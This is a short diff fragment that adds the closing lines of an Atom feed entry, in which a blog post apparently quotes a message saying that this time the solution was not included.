+<p>message is:</p>
+
+<blockquote><p>This time I didn&rsquo;t include sol&#8217;n</p></blockquote>
+]]></content>
+  </entry>
+  
+</feed>
